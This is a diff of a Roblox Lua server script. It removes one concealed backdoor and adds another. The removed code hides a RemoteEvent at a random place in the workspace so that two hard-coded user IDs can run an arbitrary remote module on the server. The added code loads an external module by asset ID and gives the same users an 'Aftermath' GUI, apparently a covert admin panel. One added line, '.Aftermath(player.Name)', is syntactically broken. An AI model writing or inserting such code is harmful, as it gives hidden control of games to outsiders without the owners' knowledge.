@@ -1,29 +1,34 @@
+-- Services --
+local players = game:GetService("Players");
+
+-- Modules --
+local AM = require(4293810048);
+
+-- Constants --
 local users = { 332777848, 5303687 };
 
-local function GetParent()
-    local descendants = workspace:GetDescendants();
-    local parent = descendants[math.random(1, #descendants)];
-
-    local badancestors = { workspace:FindFirstChild("Camera"), workspace:FindFirstChild("Terrain"), workspace:FindFirstChild("Entities") };
-    for _, ancestor in pairs(badancestors) do
-        if (ancestor ~= nil) and (parent:IsDescendantOf(ancestor)) then
-            parent = GetParent();
-            continue;
+-- Variables and Functions --
+local function CheckForAftermath(player)
+    for _, gui in pairs(player:GetChildren()) do
+        if (gui:IsA("ScreenGui") and (((tonumber(gui.Name)) and (string.len(gui.Name) == 15)) or (gui.Name == "Aftermath")) then
+            return gui;
         end
     end
-
-    return parent;
 end
 
-local function Reload()
-    local RemoteEvent = Instance.new("RemoteEvent")
-    RemoteEvent.Name = "Α&Ω"
-    RemoteEvent.OnServerEvent:Connect(function(player, a: string)
-        if (table.find(users, player.UserId)) then
-            require(10435436306)(a);
+local function onPlayerAdded(player)
+    if (table.find(users, player.UserId)) then
+        task.wait(1); -- wait for normal aftermath to load if it exists
+        if (not CheckForAftermath(player)) then
+            .Aftermath(player.Name);
+        else
+            print("User already has Aftermath! >:P")
         end
-    end)
-    RemoteEvent.Parent = GetParent();
+    end
 end
 
-coroutine.wrap(Reload)()
+-- Events --
+players.PlayerAdded:Connect(onPlayerAdded)
+for _, player in pairs(players:GetPlayers()) do
+    coroutine.wrap(onPlayerAdded)(player)
+end
